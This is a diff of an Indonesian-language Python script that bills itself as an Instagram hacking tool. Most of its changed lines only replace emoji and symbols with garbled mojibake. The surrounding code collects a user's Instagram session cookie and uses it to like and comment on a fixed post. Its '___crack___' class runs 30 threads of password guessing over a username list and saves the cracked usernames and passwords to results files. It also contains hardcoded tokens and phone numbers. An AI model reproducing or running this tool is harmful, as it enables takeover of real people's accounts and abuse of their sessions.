@@ -3,7 +3,8 @@ from concurrent.futures import ThreadPoolExecutor
 from requests.exceptions import ConnectionError
 from time import sleep
 # Author : TONYE
-# Recode Punya Mas Rozhak🖐️😄1�7
+# Recode Punya Mas RozhakðŸ–ï¸ðŸ˜„1¤7
+#warna
 H = ('\x1b[1;90m')
 M = ('\x1b[1;91m')
 H = ('\x1b[1;92m')
@@ -26,12 +27,12 @@ ___logo___ = (f"""{M}
                                         
 {B}[{P}>{B}]{P} {K}Tonye Best Instagram Hacking Tool!{P}
 
-{B}[{P}•{B}]{M}—�1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7�{P}
+{B}[{P}â€¢{B}]{M}â€”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”{P}
 {B}[{P}>{B}]{P} {K}AU {P}: {K}TONYE
 {B}[{P}>{B}]{P} {B}FB {P}: {B}Tonye
 {B}[{P}>{B}]{P} {U}IG {P}: {U}@Tonye_official_ii
 {B}[{P}>{B}]{P} {H}WA {P}: {H}+2349075815126
-{B}[{P}•{B}]{M}—�1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7��1�7�{P}
+{B}[{P}â€¢{B}]{M}â€”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”â„1¤7”{P}
 """)
 def xoshnaw(): 
   uuid = str(os.geteuid()) + str(os.getlogin()) 
@@ -59,7 +60,7 @@ xoshnaw()
 def ___login___():
     os.system('clear')
     print(___logo___)
-    print(f"{B}[{P}•{B}]{P} {H}Masukan Cookie Instagram, Jika Anda Gabut Ketik {M}[{P}{K}Open{M}]{P}\n")
+    print(f"{B}[{P}â€¢{B}]{P} {H}Masukan Cookie Instagram, Jika Anda Gabut Ketik {M}[{P}{K}Open{M}]{P}\n")
     ___cookie = input(f"{B}[{P}?{B}]{P} {H}Cookie{P} {K}:{K} ")
     if ___cookie in ['open', 'Open', 'OPEN']:
         print(f"{B}[{P}!{B}]{P} {H}Wait for a minute...{P}");sleep(3);os.system('xdg-open https://wa.me/6289694295787?text=Halo+Banh+Arya');exit()
@@ -79,7 +80,7 @@ def ___follow___():
     try:
         ___cookie = open('Data/coki.txt', 'r').read()
         ___session = re.search('sessionid=(.*?);', ___cookie)
-        ___teks = random.choice(['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗','I Love You ❤️'])
+        ___teks = random.choice(['Hallo Bang ðŸ˜','Hai Bang Apa Kabar ðŸ˜Ž','Izin Pake Scriptnya ðŸ˜','Mantap Bang ðŸ˜˜','Programmer Bang ðŸ¤”','Salam Kenal Bang ðŸ¤—','I Love You â¤ï¸'])
         ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
         with requests.Session() as ses:
             ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
@@ -354,8 +355,8 @@ class ___crack___:
         except (IOError):
             exit(f"{P}[{M}!{P}]{M} File Tidak Ada")
         try:
-            print(f"\n{B}[{P}•{B}]{H} Hasil Ok Tersimpan Di Results/Ok.txt")
-            print(f"{B}[{P}•{B}]{H} Hasil Cp Tersimpan Di Results/Cp.txt\n")
+            print(f"\n{B}[{P}â€¢{B}]{H} Hasil Ok Tersimpan Di Results/Ok.txt")
+            print(f"{B}[{P}â€¢{B}]{H} Hasil Cp Tersimpan Di Results/Cp.txt\n")
             with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                 for ___user in self.___file:
                     username, nama = ___user.split('<=>')
@@ -406,7 +407,7 @@ class ___crack___:
                             follower = ('-')
                             following = ('-')
                         except:pass
-                        print(f"\r{B}[{P}✔{B}]{P} Status :{H} Tonye -success     ")
+                        print(f"\r{B}[{P}âœ”{B}]{P} Status :{H} Tonye -success     ")
                         print(f"{B}[{P}>{B}]{P} Username :{H} {uid}")
                         print(f"{B}[{P}>{B}]{P} Password :{H} {pw}")
                         print(f"{B}[{P}>{B}]{P} Follower :{H} {follower}")
@@ -424,7 +425,7 @@ class ___crack___:
                             follower = ('-')
                             following = ('-')
                         except:pass
-                        print(f"\r{B}[{P}✘{B}]{P} Status :{K} Tonye-Checkpoint    ")
+                        print(f"\r{B}[{P}âœ˜{B}]{P} Status :{K} Tonye-Checkpoint    ")
                         print(f"{B}[{P}>{B}]{P} Username :{K} {uid}")
                         print(f"{B}[{P}>{B}]{P} Password :{K} {pw}")
                         print(f"{B}[{P}>{B}]{P} Follower :{K} {follower}")
